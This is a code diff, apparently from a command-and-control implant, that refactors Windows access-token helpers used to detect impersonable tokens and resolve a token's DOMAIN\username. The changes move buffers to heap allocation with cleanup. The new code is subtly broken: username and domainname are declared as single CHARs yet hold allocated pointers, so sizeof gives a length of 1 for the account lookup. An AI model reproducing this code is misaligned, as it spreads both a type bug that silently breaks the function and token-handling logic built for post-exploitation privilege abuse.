@@ -463,46 +463,78 @@ BOOL IsDelegationToken( HANDLE token )
 BOOL IsImpersonationToken( HANDLE token )
 {
     HANDLE temp_token                       = NULL;
-    BOOL   ret                              = FALSE;
-    LPVOID TokenImpersonationInfo[BUF_SIZE] = { 0 };
+    BOOL   ReturnValue                      = FALSE;
+    LPVOID TokenImpersonationInfo           = NULL;
     DWORD  returned_tokinfo_length          = 0;
+
+    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
+    if ( ! TokenImpersonationInfo )
+        return FALSE;
 
     if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
     {
         if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInfo) >= SecurityImpersonation)
-            return TRUE;
+            ReturnValue = TRUE;
         else
-            return FALSE;
+            ReturnValue = FALSE;
+    }
+    else
+    {
+        ReturnValue = Win32_DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &temp_token );
+        Instance.Win32.NtClose( temp_token );
     }
 
-    ret = Win32_DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &temp_token );
-    Instance.Win32.NtClose( temp_token );
+    if ( TokenImpersonationInfo )
+        Instance.Win32.LocalFree( TokenImpersonationInfo );
 
-    return ret;
+    return ReturnValue;
 }
 
 BOOL GetDomainUsernameFromToken(HANDLE token, PCHAR FullName)
 {
-    LPVOID TokenUserInfo[BUF_SIZE] = { 0 };
-    CHAR   username[BUF_SIZE]      = { 0 };
-    CHAR   domainname[BUF_SIZE]    = { 0 };
+    LPVOID TokenUserInfo           = NULL;
+    CHAR   username                = NULL;
+    CHAR   domainname              = NULL;
     DWORD  user_length             = sizeof(username);
     DWORD  domain_length           = sizeof(domainname);
     DWORD  sid_type                = 0;
     DWORD  returned_tokinfo_length = 0;
+    BOOL   ReturnValue             = FALSE;
+
+    TokenUserInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
+    if ( ! TokenUserInfo )
+        goto Cleanup;
+
+    username = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( CHAR ) );
+    if ( ! username )
+        goto Cleanup;
+
+    domainname = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( CHAR ) );
+    if ( ! domainname )
+        goto Cleanup;
 
     if ( ! Instance.Win32.GetTokenInformation( token, TokenUser, TokenUserInfo, BUF_SIZE, &returned_tokinfo_length ) )
-        return FALSE;
+        goto Cleanup;
 
     if ( ! Instance.Win32.LookupAccountSidA( NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username, &user_length, domainname, &domain_length, (PSID_NAME_USE)&sid_type ) )
-        return FALSE;
+        goto Cleanup;
 
     // Make full name in DOMAIN\USERNAME format
     StringCopyA( FullName, domainname );
     StringConcatA( FullName, "\\");
     StringConcatA( FullName, username);
 
-    return TRUE;
+    ReturnValue = TRUE;
+
+Cleanup:
+    if ( TokenUserInfo )
+        Instance.Win32.LocalFree( TokenUserInfo );
+    if ( username )
+        Instance.Win32.LocalFree( username );
+    if ( domainname )
+        Instance.Win32.LocalFree( domainname );
+
+    return ReturnValue;
 }
 
 VOID ProcessUserToken( PSavedToken SavedToken, PUniqueUserToken UniqTokens, PDWORD NumUniqTokens )
